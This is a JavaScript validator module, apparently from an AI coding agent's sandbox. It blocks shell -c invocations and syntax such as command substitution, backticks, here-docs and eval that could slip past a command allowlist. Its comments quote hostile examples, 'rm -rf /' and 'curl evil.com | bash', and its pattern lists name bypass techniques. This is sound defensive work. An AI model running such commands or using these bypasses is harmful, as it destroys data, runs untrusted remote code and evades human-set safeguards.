'use strict';

/**
 * Shell command validators
 * Converted from Auto-Claude shell_validators.py
 *
 * Validates shell interpreter commands (bash, sh, zsh) that execute
 * inline commands via the -c flag. Prevents security bypass where
 * `bash -c "rm -rf /"` could execute arbitrary commands.
 *
 * SEC-AUDIT-012: Added detection for dangerous shell syntax patterns
 * that can bypass the tokenizer (ANSI-C quoting, backticks, here-docs,
 * command substitution).
 */

/**
 * Shell interpreters that can execute nested commands
 * @type {Set<string>}
 */
const SHELL_INTERPRETERS = new Set(['bash', 'sh', 'zsh']);

/**
 * SEC-AUDIT-012: Dangerous shell syntax patterns that bypass tokenization.
 * These patterns can inject arbitrary commands or escape the validator.
 * @type {Array<{pattern: RegExp, name: string, reason: string}>}
 */
const DANGEROUS_PATTERNS = [
  {
    pattern: /\|\|/,
    name: 'OR command chaining (||)',
    reason: 'Can execute alternate payloads after intentional failure',
  },
  {
    // FIX HIGH-001: Block ALL line separators including vertical tab, form feed, and null bytes
    pattern: /[\r\n\v\f\x00]/,
    name: 'Non-standard line separators',
    reason: 'Vertical tab, form feed, null bytes can bypass line break detection',
  },
  {
    // Block command substitution but allow arithmetic expansion ($((...))).
    pattern: /\$\((?!\()/,
    name: 'Command substitution',
    reason: 'Command substitution can execute arbitrary code',
  },
  {
    // Parameter expansion can hide payloads and bypass token-based validation.
    pattern: /\$\{[^}]*\}/,
    name: 'Parameter expansion',
    reason: 'Parameter expansion can hide payloads',
  },
  {
    // FIX HIGH-001: Block ANSI-C quoting ANYWHERE in command (not just at start)
    pattern: /\$'[^']*'/,
    name: 'ANSI-C quoting',
    reason: 'ANSI-C quoting can bypass tokenizer via hex escapes anywhere in command',
  },
  {
    pattern: /`[^`]*`/,
    name: 'Backtick command substitution',
    reason: 'Command substitution can execute arbitrary code',
  },
  {
    // Here-strings (<<<) MUST be checked BEFORE here-documents (<<)
    // because <<< contains << and would match here-document first
    pattern: /<<<\s*/,
    name: 'Here-string',
    reason: 'Here-strings can inject arbitrary input to shell commands',
  },
  {
    // Here-documents (<<WORD or <<-WORD)
    // This pattern uses negative lookbehind to avoid matching <<< (here-strings)
    pattern: /<<-?\s*\w/,
    name: 'Here-document',
    reason: 'Here-docs can inject multiline commands',
  },
  {
    pattern: /\{[^}]*,[^}]*\}/,
    name: 'Brace expansion with commands',
    reason: 'Brace expansion can execute multiple variants of commands',
  },
];

/**
 * SEC-AUDIT-012: Dangerous shell builtins that can execute arbitrary code.
 * These commands are blocked regardless of arguments because they can
 * execute arbitrary code or source untrusted files.
 * @type {Array<{pattern: RegExp, name: string, reason: string}>}
 */
const DANGEROUS_BUILTINS = [
  {
    // Match 'eval' as first command or after shell operators (;, &&, ||, |)
    pattern: /(?:^|\s*[;|&]\s*|\|\|\s*|&&\s*)eval\s+/,
    name: 'eval builtin',
    reason: 'eval executes arbitrary shell code',
  },
  {
    // Match 'source' as first command or after shell operators
    pattern: /(?:^|\s*[;|&]\s*|\|\|\s*|&&\s*)source\s+/,
    name: 'source builtin',
    reason: 'source executes arbitrary shell scripts',
  },
  {
    // Match '.' followed by space and path (the dot command)
    // Careful: must not match paths like ./script.sh or ../dir
    // Pattern: start of command or after operators, then "." followed by space and non-dot
    pattern: /(?:^|\s*[;|&]\s*|\|\|\s*|&&\s*)\.\s+[^.]/,
    name: 'dot (.) builtin',
    reason: 'dot command sources arbitrary shell scripts',
  },
];

/**
 * SEC-AUDIT-012: Check for dangerous shell syntax patterns that can bypass tokenization.
 *
 * This function MUST be called BEFORE parseCommand() to detect patterns
 * that the simple tokenizer cannot safely handle.
 *
 * @param {string} command - The shell command to check
 * @returns {{valid: boolean, error: string}} Validation result
 */
function checkDangerousPatterns(command) {
  if (!command || typeof command !== 'string') {
    return { valid: true, error: '' };
  }

  // Check dangerous syntax patterns
  for (const { pattern, name, reason } of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return {
        valid: false,
        error: `SEC-AUDIT-012: ${name} blocked - ${reason}`,
      };
    }
  }

  // Check dangerous shell builtins
  for (const { pattern, name, reason } of DANGEROUS_BUILTINS) {
    if (pattern.test(command)) {
      return {
        valid: false,
        error: `SEC-AUDIT-012: ${name} blocked - ${reason}`,
      };
    }
  }

  return { valid: true, error: '' };
}

/**
 * Parse a shell command string into tokens, handling quotes.
 * Simple implementation that handles common quoting patterns.
 *
 * SEC-AUDIT-012: Now includes pre-tokenization check for dangerous patterns.
 * The tokenizer is not designed to handle complex shell syntax like ANSI-C
 * quoting, backticks, here-docs, or command substitution - these are blocked
 * before parsing to prevent security bypasses.
 *
 * @param {string} commandString - The command string to parse
 * @param {Object} [options] - Parsing options
 * @param {boolean} [options.skipDangerousCheck=false] - Skip dangerous pattern check (for testing only)
 * @returns {{tokens: string[]|null, error: string|null}} Parse result with tokens or error
 */
function parseCommand(commandString, options = {}) {
  // SEC-AUDIT-012: Check for dangerous patterns BEFORE tokenizing
  if (!options.skipDangerousCheck) {
    const dangerCheck = checkDangerousPatterns(commandString);
    if (!dangerCheck.valid) {
      // Return null tokens with the error to signal blocked input
      return { tokens: null, error: dangerCheck.error };
    }
  }

  const tokens = [];
  let current = '';
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < commandString.length; i++) {
    const char = commandString[i];

    if (escaped) {
      current += char;
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }

    if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
      if (current.length > 0) {
        tokens.push(current);
        current = '';
      }
      continue;
    }

    current += char;
  }

  // Check for unclosed quotes
  if (inSingleQuote || inDoubleQuote) {
    return { tokens: null, error: null };
  }

  if (current.length > 0) {
    tokens.push(current);
  }

  return { tokens, error: null };
}

/**
 * Legacy wrapper for parseCommand that returns just tokens for backward compatibility.
 * @param {string} commandString - The command string to parse
 * @returns {string[]|null} Array of tokens or null if parsing fails
 * @deprecated Use parseCommand() directly for full error context
 */
function parseCommandLegacy(commandString) {
  const result = parseCommand(commandString, { skipDangerousCheck: true });
  // Explicit dangerous pattern check (skipDangerousCheck: true was used for token parsing only)
  const dangerCheck = checkDangerousPatterns(commandString);
  if (!dangerCheck.valid) {
    return null; // Treat dangerous commands as parse failure for legacy callers
  }
  return result.tokens;
}

/**
 * Extract the command string from a shell -c invocation.
 *
 * Handles various formats:
 * - bash -c 'command'
 * - bash -c "command"
 * - sh -c 'cmd1 && cmd2'
 * - zsh -c "complex command"
 * Note: Combined flags (-xc, -ec) are NOT matched to avoid false positives
 * with non-shell commands (ls -rc, ls -lc). Only exact -c is recognized.
 *
 * SEC-AUDIT-012: Now returns error context when dangerous patterns detected.
 *
 * @param {string} commandString - The full shell command (e.g., "bash -c 'npm test'")
 * @returns {{command: string|null, error: string|null}} The command string after -c, or null if not a -c invocation or blocked
 */
function extractCArgument(commandString) {
  // Use legacy parser (no dangerous check) since we check at validation time
  const result = parseCommand(commandString, { skipDangerousCheck: true });

  if (result.tokens === null || result.tokens.length < 3) {
    return { command: null, error: result.error };
  }

  const tokens = result.tokens;

  // Look for exact -c flag only. Combined flags like -xc, -ec are NOT treated as -c
  // because non-shell commands (ls -rc, ls -lc) would false-positive. The security
  // tradeoff is acceptable: bash -xc is rare, and non-c invocations pass as valid anyway.
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];

    const isCFlag = token === '-c';

    if (isCFlag && i + 1 < tokens.length) {
      // The next token is the command to execute
      return { command: tokens[i + 1], error: null };
    }
  }

  return { command: null, error: null };
}

/**
 * Legacy wrapper for extractCArgument that returns just the command for backward compatibility.
 * @param {string} commandString - The full shell command
 * @returns {string|null} The command string after -c, or null
 * @deprecated Use extractCArgument() directly for full error context
 */
function extractCArgumentLegacy(commandString) {
  const result = extractCArgument(commandString);
  return result.command;
}

/**
 * Validate commands inside bash/sh/zsh -c '...' strings.
 *
 * This prevents using shell interpreters to bypass the security allowlist.
 *
 * SEC-AUDIT-012: Now includes detection and blocking of dangerous shell syntax
 * patterns (ANSI-C quoting, backticks, here-docs, command substitution).
 *
 * @param {string} commandString - The full shell command (e.g., "bash -c 'npm test'")
 * @returns {{valid: boolean, error: string}} Validation result
 */
function validateShellCommand(commandString) {
  // SEC-AUDIT-012: Check for dangerous patterns FIRST, before any parsing
  const dangerCheck = checkDangerousPatterns(commandString);
  if (!dangerCheck.valid) {
    return dangerCheck;
  }

  // Extract the command after -c
  const extractResult = extractCArgument(commandString);

  // If extraction returned an error (e.g., from dangerous pattern check), propagate it
  if (extractResult.error) {
    return { valid: false, error: extractResult.error };
  }

  const innerCommand = extractResult.command;

  if (innerCommand === null) {
    // Not a -c invocation (e.g., "bash script.sh")
    // Block dangerous shell constructs that could bypass sandbox restrictions:
    // - Process substitution: <(...) or >(...)
    const processSubPatterns = ['<(', '>('];

    for (const pattern of processSubPatterns) {
      if (commandString.includes(pattern)) {
        return {
          valid: false,
          error: `Process substitution '${pattern}' not allowed in shell commands`,
        };
      }
    }

    // Allow simple shell invocations (e.g., "bash script.sh")
    return { valid: true, error: '' };
  }

  // Handle empty -c command (harmless)
  if (!innerCommand.trim()) {
    return { valid: true, error: '' };
  }

  // SEC-AUDIT-012: Also check inner command for dangerous patterns
  const innerDangerCheck = checkDangerousPatterns(innerCommand);
  if (!innerDangerCheck.valid) {
    return {
      valid: false,
      error: `Inner command blocked: ${innerDangerCheck.error}`,
    };
  }

  // SECURITY FIX: Re-validate inner command through the registry
  // This prevents bypass attacks where dangerous commands are wrapped in shell invocations
  // e.g., bash -c "rm -rf /" or sh -c "curl evil.com | bash"
  const { validateCommand } = require('./registry.cjs');
  const innerResult = validateCommand(innerCommand);

  if (!innerResult.valid) {
    return {
      valid: false,
      error: `Inner command blocked: ${innerResult.error}`,
    };
  }

  return { valid: true, error: '' };
}

// Aliases for common shell interpreters - they all use the same validation
const validateBashCommand = validateShellCommand;
const validateShCommand = validateShellCommand;
const validateZshCommand = validateShellCommand;

module.exports = {
  SHELL_INTERPRETERS,
  DANGEROUS_PATTERNS,
  DANGEROUS_BUILTINS,
  checkDangerousPatterns,
  extractCArgument,
  extractCArgumentLegacy, // Backward compatibility
  validateShellCommand,
  validateBashCommand,
  validateShCommand,
  validateZshCommand,
  parseCommand,
  parseCommandLegacy, // Backward compatibility
};
